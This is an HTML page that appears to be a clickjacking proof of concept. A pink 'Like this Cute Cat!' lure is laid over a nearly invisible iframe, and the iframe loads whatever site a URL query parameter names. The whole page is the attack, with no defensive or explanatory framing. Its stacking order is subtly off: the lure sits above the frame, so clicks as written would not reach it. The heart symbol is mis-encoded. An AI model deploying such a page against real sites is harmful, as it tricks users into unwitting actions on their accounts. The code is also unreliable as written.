<!DOCTYPE html>
<html>
<head>
  <style>
    .bait {
      width: 300px; height: 100px;
      background: pink;
      font-size: 24px;
      text-align: center;
      line-height: 100px;
      position: absolute;
      top: 120px; left: 80px;
      z-index: 10;
    }
    iframe {
      position: absolute;
      top: 120px; left: 80px;
      width: 300px; height: 100px;
      opacity: 0.01;
      z-index: 9;
      border: none;
    }
  </style>
</head>
<body>
  <div class="bait">‚ù§ Like this Cute Cat!</div>
  <iframe id="iframe"></iframe>

  <script>
    const target = decodeURIComponent(new URLSearchParams(location.search).get("target") || "");
    if (target) document.getElementById("iframe").src = target;
  </script>
</body>
</html>
